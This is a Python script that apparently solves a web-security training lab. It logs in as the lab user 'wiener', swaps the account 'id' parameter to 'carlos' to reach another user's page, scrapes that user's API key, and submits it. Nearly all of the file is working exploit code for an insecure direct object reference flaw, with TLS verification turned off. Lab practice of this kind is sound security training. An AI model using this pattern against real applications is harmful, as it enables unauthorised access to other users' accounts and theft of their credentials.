import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def csrf_token(session,url):
    url_login=url+"/login"
    response=session.get(url_login,verify=False)
    soup=BeautifulSoup(response.text,"html.parser")
    csrf=soup.find("input",{"name":"csrf"})['value']
    return csrf
    
def get_api(session,url):

    # get csrf
    csrf= csrf_token(session,url)
   # login 
    data={"csrf":csrf,"username":"wiener","password":"peter"}
    url_login=url+"/login"
    response=session.post(url_login,data=data,verify=False) 
    response=response.text
    
    if "Log out" in response:
        print("(+) Log in Successfully")

        # get api key 
        url_api=url+"/my-account?id=carlos"
        response_api=session.get(url_api,verify=False)
        response_api=response_api.text
        if "carlos" in response_api:
            print('(+) log in into carlos acount')
            print("(+) trying to get api key .....")
            api_key=re.search("Your API Key is:(.*)",response_api).group(1)
            api_key=api_key.split('</div>')[0]
            print('(+) found carlos api key : %s' % api_key)
            print("sending api key now .....")
            url_submit=url+"/submitSolution"
            headers={"Referer":url_api}
            

            data={"answer":api_key.strip()}
            response_submit=session.post(url_submit,data=data,verify=False,headers=headers)
            response_submit=response_submit.text
            if "true" in response_submit:
                print('(+) submited successfully ')
                print("(+) Congratulations, you solved the lab!")

            else:
                print('(-) error while trying to submite api key ')
        else:
            print('(-) error while trying to get carlos acount !')
        
    else:
        print("(-) Error while trying to log in ")
   


def main():
    
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>'  %sys.argv[0])
        print('(+) Example %s www.example.com'%sys.argv[0] )
        sys.exit(-1)

    session=requests.session()
    url=sys.argv[1]
    get_api(session,url)



if __name__ == '__main__':
    main()